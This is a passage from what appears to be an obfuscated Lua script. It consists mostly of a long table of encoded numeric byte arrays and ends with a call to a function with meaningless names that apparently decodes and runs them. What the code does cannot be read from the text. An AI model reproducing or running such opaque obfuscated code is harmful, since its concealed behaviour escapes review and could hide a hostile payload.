83,239,165,79,25,194},{123,236,160,119,1,204,142},{118,234,155,127,9,213,139,41,227,168},{77,234,162,112,21,193,157,36,247},{120,243,163,110,2,220,137,11,242,179,76,6,222},{106,238,183,106,24,220,140,61,199,182,80,16},{101},{83,232,160,119},{92,230,180,77,27},1280,0.6,1.4,{0,225,181,75,29,137},{34,253,181,72,34,252,68},0,8,14,20,35,200,255,180,30,160,70,90,150,220,{26,240,154,64,30,164,118,5},{58,250,157},{6,195,153,83,228,162,80,23,196},{20,229,179,118,230,160,113,13},{5,199,158,93,247,129,119,55,223,155,50,254},{2,234,128,93,225,183,88,0,216,154,48,248,179,85},{28,202,154,87},{9,204,146,87,239,191,123},{18,193,159,83,245,183,90,29,218,183,39,231,186,94},{12,198,128,88,230,167},{10,201,154,74,207,187,109,41,221,105,39,242},{14,197,149,70,239,167,103,30,223},620,560,{39,222,150,47,232},{49,196,130,38},{54,234,144,41,189},{52,192,137,44,228,178,73,31},0.5,2,{37,211,158,35,244,172,70,1,209,110,22,207,135,89,243,255},{42,220,140,45,241,173,121,28,186,110,6,200,148,82,238},{40,215,139,35,227,133},{46,199,97,44,241,128,78,27,167},{40,218,104,60,228,166,72,11,160,107,55,192,142,84,241,163},6,1,36,{45,251,70,27,223,169,126,46,231,50,159,31,211,30},11,{55,211,105,38},{53,210,124,59,255,132,118,16,166,113},120,10,{32,142,71,25,224,168},60,15,65,22,96,{153,90,132},28,{48,167,102,45,204,182,74,254,161,79,5,135,66,32,254,129,70},32,{58,178,112,3,222,130,36},3,{213,163,120,14,222},4,{204,187,109,20,218,142},26,{227,188,116,9,195},{239,161,125,14,192,142},{211,183,101,28,241,139,61,224,176,68},{202,178,125,2,211,141,37,224,142,79,34,179,109,57,209,157,89,241,171,119,7,214},{221,177,103,30},{222,176,88,31,245,110,32,248,144,30},{223,179,89,24,228,107,55,253},{205,162,86,2,250,118,58,237,139,65,57,170,124,52,212},16,{216,176,87,6,216,105,53},{204,149,107,62,254,69,5,217,163,18,93,248},9,18,{193,190,90,28,210,101,61,241,141,115,242,170,123,4},{192,189,91,27,211,102,23,193,153,98,233,165,116,9,195,157,48,253},{199,188,88,26,172,103,20,192,158,126,239,172,127,6,237,150,40,224,168,22},{214,129,69,0,160,127,4,203,151,93},{195,168,96,30,177,121,20,194,151,86,241,187},{196,141,95,12,140,124,61,193,157},{212,130,87,22,177,123,21,215,148,94,244},{201,133,75,30,172,126,60},{207,161,89,22},{213,169,17,40,134,64,26,237,167},40,5,{},{203,143,77,244,156,100,0,220,135,39,233},{234,164,127,207,236,68,39,255,174,6,220},{241,185,123,206,237,76,44,142,180,1},{246,189,24,203,139,75,33,143,210,22,209,150,99,81,239,81,0,180},50,{239,166,121,206},80,{229,163,125,212,154},{237,167,112,216,128,93,40,230,186},{251,163,103,169,151,87,43,225},{239,166,122,207,143,101},7,{231,185,14,220,247,105,36,244,79},{239,184,18,212,248,105,33,251,77,11},{230,177,15,194,249,112,39,232,64,17,223,181},{227,188,100,220,138,100,61},{234,162,0,211,142,114,52,156,72,28,189,188,114,44,142,81,11},{157,214,102,253,169,70,82,207,125,61,237,201,91,17,234,97,1,217,145,36,248,247,71,21,221,96,59,237,139,93},{242,147,35,247},{247,165,13,208,139,125,49},{195,145,58},{196,141,35,251,148,3,17,160,97,50,152,170,93,247,157,124,22,217,147,38,245,243,4,33,208,102,43,248,154,64,92,224,58,19,197,150,33,231,134,77,13,206,103,63,182,160,70,24,182,110,57,209,149,73,168,129,110,14,223,156,58,234,142,72,6,203,36,5,207,152,95,245,165,120,12,132},{198,112,46,243,133},{209,96,33,242,216,106,29,183,93,60,214,153,83,230,181,51,68,225,144,38,235,184,90,0,156,32,122,211,133,86,225,167,70,13,205,142,39,255,246,96,6,216,118,46,249,145,85,9,232,89,41,202,147,83,231,186,122,71,227,158,38,254,179,91,19,164,104,106,145,223},{217,109,46,244,138,94},{212,108,45,248,136,15,8,182,45,60,199,156,89,189,149,120,28,224,155,59,226,182,73,16,232,41,4,212,130,100,231,191,110,10,205,156,102,166,250,73,31,216,103,61,188,139,66,64,175,114,51,204,206,120,239,161,115,14,196,119,37,244,135,5,90,147,98,56,221,138,72,246,242,50,72,253,147,36,243,177,120,31,223,112,49,237,202,89,240,229,85,9,205,133,35,238,172,70,28,151,76,58,247,132,94,20,175,117,102,228,154,92,230,180,123,58,192,158,62,240,200,26,71,232,44,37,209,195,107,247,171,105,20,202,158,127,211,180,72,31,217,100,38,181,142,70,16,170,96,54,197,155,104,162,246,77,28,153,65,37,249,145,79,26,176,106,40,139,184,78,235,176,114,8,219,153,114,208,182,72,26,216,111,6,212,138,66,228,228,38,83,132,216,38,224,189,13},{208,106,41,240,144,93,11},{221,100,61,254,220,118,25,179,65,56,218,133,87,234,177,55,72,224,115,46,228,168,66,7,183,121,11,198,156,79,237,172,127,71,153,213,12,228,177,87,32,216,121,38,251,154,64,69,137,122,14,197,147,34,248,255,68,24,214,96,58,240,139,65,82,236,48,60,199,156,89,189,149,120,28,224,155,59,226,182,73,16,232,41,6,205,141,78,231,191,107,65,135,215,8,224,185,68,28,235,106,48,229,130,64,83,139,123,63,219,149,92,254,176,82,69,254,116,33,246,140,66,17,167,52,26,204,142,84,226,181,72,18,208,136,34,186,152,70,6,211,39,28,234,135,84,238,164,127,5,255,131,35,249,189,119,23,201,97,97,208,144,93,11,175,127,59,142,210,88,230,183,55},{220,105,53},{208,104,49,252,132,19,22,244,115,62,199,144,122,204,179,85,63,210,112,59,241,128,75,81,230,95,54,196,137,94,244,162,62,78,156,177,39,240,191,69,36,211,107,44,197,153,24,194,164,118,16,204,155,55,235,171,10,39,207,104,49,245,137,88,24,231,122,115,229,146,70,193,177,126,6,193,104,118,251,128,88,31,236,101,45,196,139,25,236,225,82,0,209,151,50,249,225,74,19,201,96,125,246,156,83,26},{205,100,50,231,140,70,12},{216,102,38,191,181,25,240,235,127,15,140,135,35,228,170,80,70,222,101,34,255,223,119,30,178,66,57,213,132,84,235,182,54,75,228,147,43,236,133,89,5,227,37,109,229,136,76,211,162,120,29,202,136,54,184,242,15,81,216,104,114,237,154,90,16,189,60,47,132,187,33,230,179,13,28,153,87,62,253,145,103,29,237,47,63,203,148},{204,105,39,201,155,66,242},{166,100,36,129,179,27,241,237,113,13,142,137,37,230,168,86,88,220,103,60,249,221,117,24,188,87,59,218,151,90,228,177,65,5,194,114,100,190,203,13,28,172,46,48,194,207,73,191,153,104,39,153,222,11,253,190,73,31,237,106,38,246,154,65,162,226,54,14,222,215,49,183,145,80,47,145,38,28,249,151,89,11,178,51,117,135,134,85,237,189,62,25,198,150,36,225,200,88,76,134,105,35,228,152,84,239,128,120,9,202,210,108,185,251,67,31,216,39,55,243,140},24,{132,100,52,207,170,80,246,170,121,17,217,148,40},{139,97,43,205,149,85,235,164,122,10},62,{134,88,26,242,209,125,212,242,73,41,225,185,12,192},{171,116,47,212,147,90,237,49,158,207},{148,87,19,236},66,{143,123,60,223,134,12,228,165,85},{136,71,47,234,178,2,205,132,118},{166,115,18,223,150,37,232,248,87,1,153,101,35,246,197,83,23,175,116,50,211,129,223,8,117},76,{158,93,49,248,188,22,175,147,107,54,244},38,{45,154,241},{130,94,32,227,185,20,218},{156,93,52,225,221,9,208,138,96,59,241,89},{153,84,43,248,222,8,216,147},{144,76,40,231,183,106,212,172,103},{159,86,38,249,32,10,218,173,12,35,138,95,29,226,170,106},{134,101,39,240},{133,113,41,242,70},{153,109,46,244,74,30},{145,109,40,153,78,26,215,181},{154,107,63,227,37,5,210,162},{149,112,36,235,83,5},{154,106,61},{153,117,32},{138,105,33,240},{157,101,38},{128,109},{191,116,52,133,83,27,237,170,126,205},{172,73,4,177,108,63,198,161,76,240},{177,116,43,151,75,20},{138,64,31,171},{150,74,22,164,105,97,134},{132,84,22,175,127,124,210,155,89,178,243},{146,94,15,179,96,52,198,148},{178,65,24,186,90,58},{161,93,14,188,96,29,207,146,33,229},{129,64,11,186,102,90,132,217,37,229,164,65,2,202,103,96,250,139,66,85,164,96,50,137,134,89,229,186,114,7,216,141,102,165,234,31,71,247,63,97,148,220,6,180,244,46,84,156,201,125,188,236,10,0,254,96,39,255,191,80,7,167,84,108,223,197,71,200,237,100,50,226,76,11,175,135,106,8,179,66,51,244,170,108,209,253,118,80,243,149,17,247,167,97,20,143,59,3,207,137,83,236,174,93,40,232,150,112,206,141,77,26,213,52,22,168,208,116,10,164,91},{219,7,185,252,34,88,159,193,115,180,238,21,95,143,52,121,163,212,2},{152,79,239},{158,82,243,184,125,16,218},{133,76,247,190},{134,77,240,191,69,23,213,138,51,244,175,83},225,{175,100,245},100,{130,94,233,191,114}}
return _IO_OI0(_11124,_0l_25,_0IlO1,_l1_26)

